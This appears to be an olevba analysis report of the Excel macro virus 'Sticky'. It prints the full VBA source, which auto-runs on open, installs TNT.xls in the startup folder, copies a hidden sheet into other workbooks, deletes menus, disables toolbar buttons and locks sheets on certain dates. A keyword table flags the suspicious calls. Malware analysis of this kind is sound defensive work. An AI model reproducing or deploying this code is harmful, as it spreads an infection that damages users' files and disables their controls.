olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Sticky-399c968a25ad2b0ecc7932090e4c32c0ba12bba9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sticky.bas 
in file: Virus.MSExcel.Sticky-399c968a25ad2b0ecc7932090e4c32c0ba12bba9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sticky'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim cBook As String
Dim EdtOk, mnDltd As Boolean
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Erhdl
    EdtOk = True
    With Application
        .EnableCancelKey = xlDisabled
        .DisplayAlerts = False
        .ScreenUpdating = False
        If ThisWorkbook.Name = "TNT.xls" Then Workbooks.Add
        meExist = False
        For Each b In Workbooks
            If UCase(b.Name) = "TNT.XLS" Then meExist = True
        Next
        If meExist = False Then GoSub TNTMake
        .OnKey "~", "'TNT.xls'!myAction"
        .OnSheetActivate = "TNT.xls!Sticky.meCopy"
    End With
delMnus:
    mnDltd = False
    Call mnu(3, 1, 6, "&U")
    If mnDltd Then Exit Sub
    Call mnu(3, 1, 4, "&M")
    Call mnu(7, 3, 3, "&T")
    Call mnu(7, 5, 4, "&h")
    Call mnu(7, 6, 15, "&n")
    Call mnu(7, 6, 14, "&n")
    Call mnu(7, 6, 13, "&M")
    Call mnu(7, 6, 12, "&M")
    Call mnu(7, 8, 4, "&U")
    Call mnu(8, 3, 3, "&T")
    Call mnu(8, 5, 2, "&h")
    Call mnu(8, 6, 10, "&n")
    Call mnu(8, 6, 8, "&M")
    Call mnu(8, 7, 4, "&U")
    Call mnu(9, 2, 11, "&S")
    Call mnu(9, 3, 3, "&T")
    Call mnu(9, 5, 5, "&I")
    Call mnu(9, 5, 1, "&t")
    Call mnu(9, 6, 14, "&d")
    Call mnu(9, 6, 10, "&M")
    Call mnu(9, 7, 4, "&U") 'next
    Call shrtMn(1, 11)
    Call shrtMn(1, 10)
    Call shrtMn(2, 6)
    Call shrtMn(9, 7)
    Call shrtMn(14, 13)
    Call shrtMn(15, 12)
    Call shrtMn(16, 12) 'next
    Call Bttn(5, 15)
    Call Bttn(7, 5)
    Call Bttn(9, 3)
    Call Bttn(9, 4)
    Call Bttn(9, 6)
    Call Bttn(9, 7)
    Call Bttn(9, 15)
    Exit Sub
TNTMake:
    Workbooks("TNT.xls").Close
    With Application
        n = .SheetsInNewWorkbook
        .SheetsInNewWorkbook = 1
        Workbooks.Add
        .SheetsInNewWorkbook = n
        ThisWorkbook.Sheets("Sticky").Copy Before:=ActiveSheet
        Set cS = ActiveSheet
        cS.OnSheetActivate = "meHide"
        cS.Visible = False
    End With
    s = Application.StartupPath
    Kill s & "\TNT.xls"
    ActiveWorkbook.SaveAs Filename:=s & "\TNT.xls"
    ActiveWindow.Visible = False
    Workbooks("TNT.xls").Close savechanges:=True
    Workbooks.Open Filename:=s & "\TNT.xls"
    Return
Erhdl:
    Resume Next
End Sub
Sub meCopy()
Attribute meCopy.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Erhdl
    With Application
        .EnableCancelKey = xlDisabled
        .ScreenUpdating = False
        .DisplayAlerts = False
        .OnKey "~", "'TNT.xls'!myAction"
    End With
    cDrv = Left(CurDir(), 1)
    With ActiveWorkbook
        If ActiveSheet.Name = "Sticky" Then ActiveSheet.Visible = False
        If UCase(Left(.Name, 4)) = "BOOK" Then
            If EdtOk Or EdtOk = "" Then Exit Sub
        End If
        For Each sh In .Sheets
            If sh.Name = "Sticky" Then Exit Sub
        Next
        ThisWorkbook.Sheets("Sticky").Copy Before:=ActiveSheet
        Set cS = ActiveSheet
        cS.OnSheetActivate = "meHide"
        cS.Visible = False
        If UCase(Left(.Name, 8)) = "DATABASE" Then
            cS.Unprotect password:="Project"
            cS.Protect password:="" & Second(Time) / 11
        End If
        If UCase(Left(.Name, 4)) <> "BOOK" And cDrv <> "A" Then .Save
    End With
    Exit Sub
Erhdl:
    Resume Next
End Sub
Sub myAction()
Attribute myAction.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Ex
    cBook = ActiveWorkbook.Name
    With Application
        .EnableCancelKey = xlDisabled
        EdtOk = False
        .SendKeys "{DOWN}"
        meCopy
        .OnKey "~"
        If Now < DateValue("May 1, 1998") Or WeekDay(Now) <> 7 Or _
            Time < TimeValue("11:59:59 AM") Then GoTo Ex
        EnableEdt
        EdtOk = True
        .OnKey "~", "'TNT.xls'!myAction"
        MsgBox "Please stop for a while to get relaxed!", 0 + 48, "TNT"
        .OnTime Now + TimeValue("00:00:10"), "'TNT.xls'!EnableEdt"
    End With
Ex:
    EdtOk = True
End Sub
Sub EnableEdt()
Attribute EnableEdt.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Erhdl
    Application.EnableCancelKey = xlDisabled
    Application.ScreenUpdating = False
    nBook = ActiveWorkbook.Name
    Workbooks(cBook).Activate
    If EdtOk Then
        ActiveSheet.Unprotect password:=""
    Else
        ActiveSheet.Protect password:=""
    End If
    Workbooks(nBook).Activate
Erhdl:
    Resume Next
End Sub
Sub meHide()
Attribute meHide.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.EnableCancelKey = xlDisabled
    ActiveSheet.Visible = False
End Sub
Sub mnu(mbarInd, mnuInd, mnuItem As Integer, myStr As String)
Attribute mnu.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.EnableCancelKey = xlDisabled
    With MenuBars(mbarInd)
        Set mN = .Menus(mnuInd).MenuItems(mnuItem)
        If InStr(1, mN.Caption, myStr, 1) <> 0 Then
            mN.Delete
        Else
            mnDltd = True
        End If
    End With
End Sub
Sub Bttn(Tlbr, tBttn As Integer)
Attribute Bttn.VB_ProcData.VB_Invoke_Func = " \n14"
    Toolbars(Tlbr).ToolbarButtons(tBttn).Enabled = False
End Sub
Sub shrtMn(ind, itm As Integer)
Attribute shrtMn.VB_ProcData.VB_Invoke_Func = " \n14"
    ShortcutMenus(ind).MenuItems(itm).Delete
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 1
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Stick
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - 2
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

